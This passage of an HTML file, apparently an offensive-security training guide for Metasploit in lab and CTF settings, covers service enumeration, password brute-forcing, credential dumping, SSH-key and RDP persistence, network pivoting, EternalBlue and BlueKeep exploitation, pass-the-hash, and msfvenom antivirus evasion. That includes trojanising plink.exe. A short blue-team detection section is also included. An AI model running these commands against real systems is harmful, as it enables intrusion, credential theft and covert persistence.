+set PASS_FILE rockyou.txt
+run</code></pre>
+
+  <h3>Service-Specific Enumeration</h3>
+  <pre><code># SNMP community string brute-force
+use auxiliary/scanner/snmp/snmp_login
+set RHOSTS 192.168.56.30
+run
+
+# DNS enumeration
+use auxiliary/gather/dns_enum
+set DOMAIN target.com
+run
+
+# SMTP user enumeration (VRFY/EXPN)
+use auxiliary/scanner/smtp/smtp_enum
+set RHOSTS 192.168.56.30
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+run
+
+# Directory brute-force
+use auxiliary/scanner/http/dir_scanner
+set RHOSTS 192.168.56.30
+set DICTIONARY /usr/share/wordlists/dirb/common.txt
+run</code></pre>
+
+  <h3>Database Storage — Hosts &amp; Services</h3>
+  <pre><code># Import Nmap XML into MSF database
+db_nmap -sC -sV -p- 192.168.56.30
+
+# Query stored data
+hosts                        # all discovered hosts
+hosts -c address,os_name     # specific columns
+services                     # all discovered services
+services -p 445              # filter by port
+services -s smb              # filter by service name
+vulns                        # detected vulnerabilities
+creds                        # captured credentials
+
+# Export data
+hosts -o hosts.csv           # export hosts to CSV
+services -o services.csv</code></pre>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Port Scanning with MSF Auxiliary</h4>
+      <ul>
+        <li>The TCP connect scanner (<code>scanner/portscan/tcp</code>) works without root; SYN scanner requires root for raw socket access at L4</li>
+        <li>Store scan results in the MSF database using <code>db_nmap</code> rather than running Nmap separately</li>
+        <li>Use <code>services -p 445</code> to filter the database for a specific port after scanning a subnet</li>
+      </ul>
+      <pre><code>use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.56.0/24
+set PORTS 22,80,443,445,3389
+set THREADS 50
+run
+services -p 445                   <span class="cm"># filter DB results by port</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Targeted Service Enumeration</h4>
+      <ul>
+        <li>Use SMB version scanner to identify unpatched Windows versions before selecting an exploit — match OS to module target list</li>
+        <li>Combine <code>smb_ms17_010</code> auxiliary check with exploit to confirm vulnerability before running destructive code</li>
+        <li>Use service-specific modules (SMTP enum, SNMP brute, DNS enum) to gather usernames and credentials non-destructively</li>
+      </ul>
+      <pre><code>use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.56.0/24
+run
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.56.30
+run                               <span class="cm"># confirms vulnerability before exploit</span></code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Credential Spraying and Database-Driven Targeting</h4>
+      <ul>
+        <li>Combine credential modules (SSH, SMB login scanners) with captured hashes or wordlists to test lateral movement opportunities at L4</li>
+        <li>Use <code>db_nmap</code> to ingest full Nmap XML into MSF DB then query with <code>hosts</code>/<code>services</code> to build targeted exploit workflows</li>
+        <li>Export results to CSV for reporting: <code>hosts -o hosts.csv</code> and <code>services -o services.csv</code></li>
+      </ul>
+      <pre><code>use auxiliary/scanner/smb/smb_login
+set RHOSTS 192.168.56.0/24
+set SMBUser administrator
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set THREADS 4
+run
+creds                             <span class="cm"># view all captured credentials in DB</span>
+hosts -o /root/pentest/hosts.csv  <span class="cm"># export for reporting</span></code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 06 -->
+<template id="tpl-post">
+<article class="topic">
+  <h2>Post-Exploitation Modules</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Post-exploitation modules run entirely at L7 inside an established session — they interact with OS APIs, registries, and processes rather than initiating new L3/L4 network connections.</span>
+  </div>
+  <p>Post modules run inside an existing session for privilege escalation, persistence, lateral movement, and data collection.
+    <a href="#" class="xref" onclick="loadTopic('sessions'); return false;">Session management ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('pivoting'); return false;">Pivoting ↗</a>
+  </p>
+
+  <h3>Running Post Modules</h3>
+  <pre><code># From msfconsole — two ways:
+# Method 1: from within a session
+sessions -i 1
+run post/windows/gather/hashdump
+
+# Method 2: from msfconsole (specify session)
+use post/windows/gather/hashdump
+set SESSION 1
+run</code></pre>
+
+  <h3>Windows Post-Exploitation Modules</h3>
+  <table>
+    <thead><tr><th>Module</th><th>What It Does</th></tr></thead>
+    <tbody>
+      <tr><td><code>post/windows/gather/hashdump</code></td><td>Dump SAM database NTLM hashes (requires SYSTEM)</td></tr>
+      <tr><td><code>post/windows/gather/credentials/credential_collector</code></td><td>Harvest browser saved passwords, WinSCP, PuTTY, FTP clients</td></tr>
+      <tr><td><code>post/windows/gather/enum_logged_on_users</code></td><td>List currently logged-in users across all sessions</td></tr>
+      <tr><td><code>post/windows/gather/enum_shares</code></td><td>Enumerate network shares and permissions</td></tr>
+      <tr><td><code>post/windows/gather/enum_applications</code></td><td>Installed software — find vulnerable apps</td></tr>
+      <tr><td><code>post/windows/gather/enum_patches</code></td><td>List missing Windows patches (compare vs Exploit-DB)</td></tr>
+      <tr><td><code>post/windows/manage/enable_rdp</code></td><td>Enable RDP, add firewall rule, optionally add local user</td></tr>
+      <tr><td><code>post/windows/manage/persistence_exe</code></td><td>Establish persistence via registry run key or service</td></tr>
+      <tr><td><code>post/multi/recon/local_exploit_suggester</code></td><td>Suggest local privilege escalation exploits based on OS/patches</td></tr>
+      <tr><td><code>post/windows/escalate/getsystem</code></td><td>Multiple SYSTEM privilege escalation techniques</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Linux Post-Exploitation Modules</h3>
+  <table>
+    <thead><tr><th>Module</th><th>What It Does</th></tr></thead>
+    <tbody>
+      <tr><td><code>post/linux/gather/hashdump</code></td><td>Dump /etc/shadow (requires root)</td></tr>
+      <tr><td><code>post/linux/gather/enum_configs</code></td><td>Enumerate config files that may contain credentials</td></tr>
+      <tr><td><code>post/linux/gather/enum_network</code></td><td>Network interfaces, routes, hosts file, ARP table</td></tr>
+      <tr><td><code>post/linux/gather/enum_system</code></td><td>OS version, kernel, installed packages, cron jobs, SUID binaries</td></tr>
+      <tr><td><code>post/multi/recon/local_exploit_suggester</code></td><td>Suggest kernel/local exploits for Linux</td></tr>
+      <tr><td><code>post/linux/manage/sshkey_persistence</code></td><td>Add attacker's public key to authorized_keys for persistent SSH</td></tr>
+    </tbody>
+  </table>
+
+  <h3>local_exploit_suggester — Privilege Escalation Aid</h3>
+  <pre><code># After getting a session
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+# Output example:
+# [*] 192.168.56.30 - Collecting local exploits for x64/windows...
+# [+] ms16_032_secondary_logon_handle_privesc - The target appears to be vulnerable.
+# [+] ms16_075_reflection_juicy - The target appears to be vulnerable.
+
+# Select a suggested exploit
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+set SESSION 1
+set LHOST 192.168.56.10
+run</code></pre>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Running Post Modules Against a Session</h4>
+      <ul>
+        <li>Post modules require an active session — always specify <code>set SESSION N</code> before running</li>
+        <li>Use <code>local_exploit_suggester</code> as the first post module on any new session to identify privilege escalation paths</li>
+        <li>Run <code>hashdump</code> after achieving SYSTEM — hashes enable pass-the-hash attacks without cracking passwords</li>
+      </ul>
+      <pre><code>use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run                               <span class="cm"># lists likely local privilege escalation exploits</span>
+use post/windows/gather/hashdump
+set SESSION 1
+run                               <span class="cm"># dumps SAM NTLM hashes</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Data Gathering and Lateral Movement Setup</h4>
+      <ul>
+        <li>Use <code>enum_logged_on_users</code> and <code>enum_shares</code> to map the network from the compromised host's perspective</li>
+        <li>Use <code>enable_rdp</code> to open RDP for persistent, stealthy access that survives a Meterpreter session termination</li>
+        <li>Combine <code>credential_collector</code> with <code>enum_applications</code> to harvest stored credentials from browsers, FTP clients, and SSH tools</li>
+      </ul>
+      <pre><code>run post/windows/gather/enum_logged_on_users
+run post/windows/gather/enum_shares
+run post/windows/gather/enum_applications
+run post/windows/manage/enable_rdp    <span class="cm"># persistent access via RDP</span>
+run post/windows/gather/credentials/credential_collector</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Linux Post-Exploitation and Persistence</h4>
+      <ul>
+        <li>Use <code>sshkey_persistence</code> on Linux targets to add your public key to <code>authorized_keys</code> for persistent SSH access that survives reboots</li>
+        <li>Use <code>enum_system</code> to identify SUID binaries and cron jobs — common Linux privilege escalation vectors</li>
+        <li>Chain <code>local_exploit_suggester</code> output directly into a follow-up exploit module using the same session number</li>
+      </ul>
+      <pre><code>use post/linux/manage/sshkey_persistence
+set SESSION 1
+run                               <span class="cm"># adds attacker pubkey to authorized_keys</span>
+use post/linux/gather/enum_system
+set SESSION 1
+run                               <span class="cm"># enumerates kernel, SUID binaries, cron jobs</span></code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 07 -->
+<template id="tpl-pivoting">
+<article class="topic">
+  <h2>Pivoting &amp; Network Tunneling</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Pivoting manipulates L3 routing tables through a compromised host, tunnels L4 TCP over SOCKS5 proxies, and leverages L7 Meterpreter to bridge network segments invisible from Kali.</span>
+  </div>
+  <p>After compromising a host, pivoting allows attacking internal network segments that are not directly reachable from Kali. Metasploit has built-in routing and SOCKS proxy capabilities.
+    <a href="#" class="xref" onclick="loadTopic('sessions'); return false;">Managing sessions ↗</a>
+  </p>
+
+  <h3>Route-Based Pivoting</h3>
+  <pre><code># Add a route through session 1 to reach 192.168.100.0/24 (internal net)
+route add 192.168.100.0/24 1     # 1 = session ID
+route                            # view routing table
+route flush                      # remove all routes
+
+# Now MSF modules can reach 192.168.100.0/24 through the pivot
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.100.0/24
+set PORTS 22,80,445,3389
+run
+
+# autoroute post module (preferred — auto-discovers subnets)
+use post/multi/manage/autoroute
+set SESSION 1
+set CMD add
+run</code></pre>
+
+  <h3>SOCKS Proxy for Non-MSF Tools</h3>
+  <pre><code># Set up SOCKS5 proxy on Kali (all traffic through MSF session)
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+set VERSION 5
+run -j                   # background job
+
+# Configure proxychains
+# Edit /etc/proxychains4.conf — add at bottom:
+# socks5 127.0.0.1 1080
+
+# Use any tool through the pivot
+proxychains nmap -sT -Pn 192.168.100.10         # TCP connect scan (SYN won't work through SOCKS)
+proxychains curl http://192.168.100.10/
+proxychains ssh user@192.168.100.10
+proxychains crackmapexec smb 192.168.100.0/24</code></pre>
+
+  <h3>Port Forwarding (Meterpreter)</h3>
+  <pre><code># Inside Meterpreter session
+# Forward local Kali port 8080 to internal host:80
+portfwd add -l 8080 -p 80 -r 192.168.100.10
+
+# Forward Kali 13389 to internal Windows host RDP
+portfwd add -l 13389 -p 3389 -r 192.168.100.20
+
+# Connect to forwarded ports normally from Kali
+# xfreerdp /v:127.0.0.1:13389 /u:administrator
+# curl http://127.0.0.1:8080/
+
+# List port forwards
+portfwd list
+
+# Remove a forward
+portfwd delete -l 8080
+
+# Flush all
+portfwd flush</code></pre>
+
+  <h3>Double Pivot (Two Hops)</h3>
+  <pre><code"># Scenario: Kali → 192.168.56.30 (Win10) → 192.168.100.10 (jump host) → 10.10.10.5 (target)
+
+# Step 1: Route through Win10 session (1) to 192.168.100.0/24
+route add 192.168.100.0/24 1
+
+# Step 2: Exploit jump host 192.168.100.10 through proxy
+use exploit/linux/ssh/openssh_...
+set RHOSTS 192.168.100.10
+run    # session 2 opens
+
+# Step 3: Route through jump host session (2) to 10.10.10.0/24
+route add 10.10.10.0/24 2
+
+# Now attack 10.10.10.5 through both hops
+# Note: each hop adds latency; SOCKS proxy not nested by default</code></pre>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Adding Routes Through a Session</h4>
+      <ul>
+        <li>After backgrounding a session, use <code>route add SUBNET SESSION_ID</code> to make internal subnets reachable through the pivot host</li>
+        <li>MSF modules will automatically use the route — no additional configuration needed for auxiliary/exploit modules</li>
+        <li>Use <code>autoroute</code> post module to automatically discover and add all subnets visible from the compromised host</li>
+      </ul>
+      <pre><code>background                        <span class="cm"># return to msfconsole from Meterpreter</span>
+route add 192.168.100.0/24 1      <span class="cm"># route internal subnet through session 1</span>
+route                             <span class="cm"># verify routing table</span>
+use post/multi/manage/autoroute
+set SESSION 1
+run                               <span class="cm"># auto-discovers all subnets</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>SOCKS Proxy for Non-MSF Tools</h4>
+      <ul>
+        <li>Set up a SOCKS5 proxy via MSF to tunnel Nmap, curl, CrackMapExec, and other tools through the pivot at L4</li>
+        <li>Configure <code>/etc/proxychains4.conf</code> with <code>socks5 127.0.0.1 1080</code> then prefix any command with <code>proxychains</code></li>
+        <li>Use TCP connect scan (<code>-sT</code>) through proxychains — SYN scan does not work through SOCKS proxies</li>
+      </ul>
+      <pre><code>use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+set VERSION 5
+run -j                            <span class="cm"># background SOCKS listener</span>
+proxychains nmap -sT -Pn 192.168.100.0/24
+proxychains crackmapexec smb 192.168.100.0/24</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Port Forwarding and Double Pivoting</h4>
+      <ul>
+        <li>Use <code>portfwd</code> inside Meterpreter to forward a local Kali port to a specific internal host:port — useful for reaching RDP, databases, and web apps</li>
+        <li>Chain two routes across two sessions to reach networks two hops deep from Kali (Kali → Pivot1 → Pivot2 → Target)</li>
+        <li>Each pivot hop adds latency — use specific port forwards rather than broad subnet routes for time-sensitive exploitation</li>
+      </ul>
+      <pre><code>portfwd add -l 13389 -p 3389 -r 192.168.100.20  <span class="cm"># forward RDP to internal host</span>
+portfwd add -l 8080  -p 80   -r 192.168.100.10  <span class="cm"># forward HTTP</span>
+portfwd list                  <span class="cm"># verify forwards</span>
+route add 10.10.10.0/24 2     <span class="cm"># second hop through session 2</span></code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 08 -->
+<template id="tpl-exploits">
+<article class="topic">
+  <h2>Notable Exploit Modules</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Exploit modules target a specific L3 IP and L4 port to exploit an L7 application vulnerability (SMB, RDP, HTTP) — the L3/L4 combination identifies the target; L7 delivers the shellcode.</span>
+  </div>
+  <p>A curated reference of high-impact, frequently-used exploits for lab and CTF environments. Always verify target version before using.</p>
+
+  <h3>Windows Exploits</h3>
+  <table>
+    <thead><tr><th>Module</th><th>CVE / MS</th><th>Target</th><th>Notes</th></tr></thead>
+    <tbody>
+      <tr>
+        <td><code>exploit/windows/smb/ms17_010_eternalblue</code></td>
+        <td>CVE-2017-0144 / MS17-010</td>
+        <td>Windows 7/2008 R2 with SMBv1</td>
+        <td>No auth required; SYSTEM shell; extremely reliable; patched but many unpatched hosts remain</td>
+      </tr>
+      <tr>
+        <td><code>exploit/windows/smb/ms17_010_psexec</code></td>
+        <td>CVE-2017-0144</td>
+        <td>Windows 7/2008 — reliable alternative</td>
+        <td>Uses EternalBlue for auth bypass then PSExec for execution; more stable on some configs</td>
+      </tr>
+      <tr>
+        <td><code>exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code></td>
+        <td>CVE-2019-0708 BlueKeep</td>
+        <td>Windows 7/2008, RDP enabled</td>
+        <td>Unauthenticated RCE; unstable — can BSOD target; requires exact target version</td>
+      </tr>
+      <tr>
+        <td><code>exploit/windows/local/ms16_032_secondary_logon_handle_privesc</code></td>
+        <td>MS16-032</td>
+        <td>Windows 7-10 local privesc</td>
+        <td>Requires existing session; escalates to SYSTEM via Secondary Logon service</td>
+      </tr>
+      <tr>
+        <td><code>exploit/windows/local/cve_2021_34527_printspooler_authbypass</code></td>
+        <td>CVE-2021-34527 PrintNightmare</td>
+        <td>Windows 10/2019, Print Spooler running</td>
+        <td>Loads malicious DLL via Print Spooler; local SYSTEM or remote RCE variant</td>
+      </tr>
+      <tr>
+        <td><code>exploit/windows/smb/psexec</code></td>
+        <td>N/A (tool abuse)</td>
+        <td>Any Windows with valid admin creds or hash</td>
+        <td>Pass-the-hash using NTLM — set SMBPass to NTLM hash directly</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>Linux Exploits</h3>
+  <table>
+    <thead><tr><th>Module</th><th>CVE</th><th>Target</th><th>Notes</th></tr></thead>
+    <tbody>
+      <tr>
+        <td><code>exploit/multi/handler</code></td>
+        <td>N/A</td>
+        <td>All platforms</td>
+        <td>Generic handler for manually delivered payloads</td>
+      </tr>
+      <tr>
+        <td><code>exploit/unix/webapp/drupal_drupalgeddon2</code></td>
+        <td>CVE-2018-7600</td>
+        <td>Drupal 6–8</td>
+        <td>Pre-auth RCE via form API — extremely impactful in its time</td>
+      </tr>
+      <tr>
+        <td><code>exploit/multi/http/struts2_content_type_ognl</code></td>
+        <td>CVE-2017-5638</td>
+        <td>Apache Struts 2</td>
+        <td>Jakarta multipart parser — Remote Code Execution via Content-Type header</td>
+      </tr>
+      <tr>
+        <td><code>exploit/linux/local/cve_2022_0847_dirtypipe</code></td>
+        <td>CVE-2022-0847 DirtyPipe</td>
+        <td>Linux kernel 5.8–5.16</td>
+        <td>Pipe privilege escalation — overwrite read-only files; write root-owned /etc/passwd</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>Pass-the-Hash with Metasploit</h3>
+  <pre><code># Use captured NTLM hash instead of password
+use exploit/windows/smb/psexec
+set RHOSTS 192.168.56.30
+set SMBUser administrator
+set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+# Format: LMhash:NThash (use AAD3... for blank LM)
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.10
+run
+
+# CrackMapExec pass-the-hash (spray across subnet)
+crackmapexec smb 192.168.56.0/24 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c
+# Hosts showing (Pwn3d!) = successful admin authentication</code></pre>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>EternalBlue — The Most Important Lab Exploit</h4>
+      <ul>
+        <li>EternalBlue targets L4 port 445 (SMBv1) to deliver SYSTEM-level shellcode — always start with the auxiliary check before running the exploit</li>
+        <li>Verify the target is Windows 7 or Windows 2008 R2 via <code>smb_version</code> scan before selecting the module</li>
+        <li>Set up <code>multi/handler</code> first — EternalBlue fires fast and the session will open immediately</li>
+      </ul>
+      <pre><code>use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.56.30
+run                               <span class="cm"># confirm vulnerable before exploit</span>
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.56.30
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.10
+run</code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Local Privilege Escalation Modules</h4>
+      <ul>
+        <li>Use <code>local_exploit_suggester</code> to identify applicable local escalation exploits — always run this before manually guessing modules</li>
+        <li>PrintNightmare (<code>CVE-2021-34527</code>) has both local and remote variants — local requires an existing session; remote targets Print Spooler directly at L4</li>
+        <li>Pass-the-hash with psexec works against any Windows host with admin credentials — use the LM:NT hash format directly</li>
+      </ul>
+      <pre><code>use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+set SESSION 1
+set LHOST 192.168.56.10
+run</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Exploit Selection by CVE and Version Fingerprinting</h4>
+      <ul>
+        <li>Cross-reference OS version from <code>sysinfo</code> or Nmap banner with <code>show targets</code> to select the precise exploit target index — wrong target = crash or no session</li>
+        <li>BlueKeep (<code>CVE-2019-0708</code>) can BSOD the target — always have a crash recovery plan in lab; avoid on production systems</li>
+        <li>For Struts/web exploits, confirm exact version from HTTP response headers before firing to avoid instability</li>
+      </ul>
+      <pre><code>search CVE-2019-0708
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+show targets                      <span class="cm"># MUST match exact Windows version</span>
+set TARGET 2                      <span class="cm"># select correct target index</span>
+set RHOSTS 192.168.56.30
+set LHOST 192.168.56.10
+check                             <span class="cm"># verify vulnerable before firing</span></code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 09 -->
+<template id="tpl-evasion">
+<article class="topic">
+  <h2>Evasion Techniques</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Evasion operates at L7 — modifying payload bytes, blending C2 traffic with HTTPS, and migrating between processes are all application-layer behaviors that defenders must detect through behavioral analysis rather than L3/L4 signatures.</span>
+  </div>
+  <p>Modern AV and EDR products detect Meterpreter and common MSF payloads by signature. These techniques demonstrate why defenders need behavior-based detection, not just signature AV.</p>
+
+  <div class="callout warn">
+    <strong>Authorized testing context only.</strong> These techniques are documented for understanding attacker methodology and improving defensive detection — not for bypassing security controls without authorization.
+  </div>
+
+  <h3>Encoding (Limited Effectiveness vs Modern AV)</h3>
+  <pre><code># Encode with x64/xor_dynamic (multiple iterations)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 \
+  -e x64/xor_dynamic -i 10 -f exe -o encoded_10.exe
+
+# Available x64 encoders
+msfvenom -l encoders | grep x64
+
+# Note: Most AV products see through encoding now — behavioral analysis catches execution</code></pre>
+
+  <h3>Template Injection (Less Detectable)</h3>
+  <pre><code"># Inject payload into a legitimate signed binary
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 \
+  -x /usr/share/windows-binaries/plink.exe -k -f exe -o plink_backdoor.exe
+
+# The legitimate binary runs normally; payload runs in background thread</code></pre>
+
+  <h3>Staged vs Stageless for Evasion</h3>
+  <table>
+    <thead><tr><th>Approach</th><th>AV Detection Risk</th><th>Notes</th></tr></thead>
+    <tbody>
+      <tr><td>Stageless payload (large, full Meterpreter in file)</td><td>Higher — full signature present on disk</td><td>Simpler delivery; all code in one file</td></tr>
+      <tr><td>Staged payload (small stager, downloads Meterpreter)</td><td>Lower initially — stager is tiny</td><td>Meterpreter injected into memory; no full payload on disk</td></tr>
+      <tr><td>HTTPS payload</td><td>Network detection harder</td><td>Traffic blends with HTTPS; set up valid cert for Metasploit listener</td></tr>
+      <tr><td>Process migration (post-exploitation)</td><td>N/A (already running)</td><td>Migrate from AV-monitored process to trusted one (explorer.exe, svchost.exe)</td></tr>
+    </tbody>
+  </table>
+
+  <h3>What Defenders See (Blue Team View)</h3>
+  <pre><code"># Suricata signatures that fire on Metasploit traffic:
+# ET EXPLOIT Possible CVE-2017-0144 EternalBlue
+# ET MALWARE Meterpreter Reverse TCP
+# ET TROJAN Metasploit Meterpreter stdapi Init
+
+# Zeek will log the TCP connection:
+# conn.log: orig_bytes very large (full Meterpreter stage download)
+# ssl.log: self-signed certificate (if using reverse_https without proper cert)
+
+# Windows Event Log indicators:
+# Event 4688: Process Creation — msfvenom-generated exe spawned
+# Event 4698: Scheduled task created (if persistence used)
+# Event 7045: New service installed (if psexec module used)
+# Sysmon Event 1: Process created with unusual parent-child chain
+
+# Detection rule logic:
+# any suspicious process spawning cmd.exe or powershell.exe as child
+# network connection from non-browser process to external IP on 4444/443
+# LSASS memory read (Event 10 Sysmon) = credential dumping</code></pre>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Why Encoding Has Limited Value</h4>
+      <ul>
+        <li>Encoding changes the payload bytes but modern AV uses behavioral detection — encoded payloads still get flagged when they execute</li>
+        <li>Using HTTPS (<code>reverse_https</code>) on port 443 is more effective for evading network-based detection than encoding the file itself</li>
+        <li>Understand what defenders see: Suricata fires on Meterpreter staging traffic, Zeek logs large <code>orig_bytes</code> on the exploit connection</li>
+      </ul>
+      <pre><code>msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=192.168.56.10 LPORT=443 -f exe -o https_payload.exe
+<span class="cm"># HTTPS blends with normal traffic; harder to detect at L4 than port 4444</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Staged Payloads and Process Migration</h4>
+      <ul>
+        <li>Staged payloads keep the initial on-disk artifact small — only the tiny stager has a file signature; Meterpreter is injected into memory</li>
+        <li>Immediately migrate to a trusted process (explorer.exe, svchost.exe) after getting a session to move Meterpreter out of the monitored exploit process</li>
+        <li>Use <code>-k</code> flag in msfvenom template injection to run the payload in a background thread while the legitimate binary runs normally</li>
+      </ul>
+      <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.56.10 LPORT=4444 \
+  -x /usr/share/windows-binaries/plink.exe -k -f exe -o trojan.exe
+<span class="cm"># After session opens:</span>
+meterpreter > migrate 3120        <span class="cm"># migrate to explorer.exe immediately</span></code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Behavioral Detection Awareness (Blue Team Perspective)</h4>
+      <ul>
+        <li>Defenders should tune Sysmon Event ID 1 rules for suspicious parent-child process chains and Event ID 10 for LSASS memory reads</li>
+        <li>Zeek <code>ssl.log</code> catches self-signed certificates on the Meterpreter HTTPS listener — use a properly signed cert via Let's Encrypt for realistic evasion</li>
+        <li>Even with evasion, behavioral analytics catch Meterpreter's characteristic polling interval and traffic timing patterns</li>
+      </ul>
+      <pre><code><span class="cm"># Sysmon rule targeting suspicious process creation:</span>
+<span class="cm"># Event ID 1: cmd.exe or powershell.exe spawned from unusual parent</span>
+<span class="cm"># Event ID 10: svchost.exe reading LSASS process memory</span>
+<span class="cm"># Zeek conn.log: large orig_bytes on port 445 = EternalBlue</span>
+<span class="cm"># Suricata: ET MALWARE Meterpreter Reverse TCP (SID 2014526)</span></code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 10 -->
+<template id="tpl-armitage">
+<article class="topic">
+  <h2>Armitage &amp; Automation</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Armitage and resource scripts orchestrate Metasploit at the application layer — they automate module selection, option configuration, and session management without changing the underlying L3/L4/L7 attack mechanics.</span>
+  </div>
+  <p>Armitage is a GUI front-end for Metasploit. Resource scripts automate complex sequences. Both are useful for team engagements and CTF competitions.</p>
+
+  <h3>Armitage Basics</h3>
+  <pre><code># Start Armitage (requires MSF DB running)
+sudo msfdb start
+armitage
+
+# Armitage layout:
+# Top-left: Module browser (Attacks / Auxiliary / Post)
+# Top-right: Target visualization canvas
+# Bottom: msfconsole console tab + event log
+
+# Scan → find hosts
+Hosts → Nmap Scan → Quick Scan (OS detect)
+
+# Auto-attack (Hail Mary — tries all compatible exploits)
+# Right-click target → Attack → Hail Mary
+# NOT recommended: creates massive noise, often crashes targets
+
+# Manual exploit
+# Right-click target → Attack → smb → ms17_010_eternalblue → Launch</code></pre>
+
+  <h3>Resource Script Automation</h3>
+  <pre><code"># Automated engagement setup script: full_lab.rc
+cat > full_lab.rc << 'EOF'
+# Initialize workspace
+workspace -a lab_20240315
+
+# Import nmap results
+db_import /root/pentest/nmap_full.xml
+
+# Launch persistent handler
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.10
+set LPORT 4444
+set ExitOnSession false
+run -j
+
+# Scan for EternalBlue candidates
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.56.0/24
+set THREADS 10
+run
+EOF
+
+msfconsole -r full_lab.rc</code></pre>
+
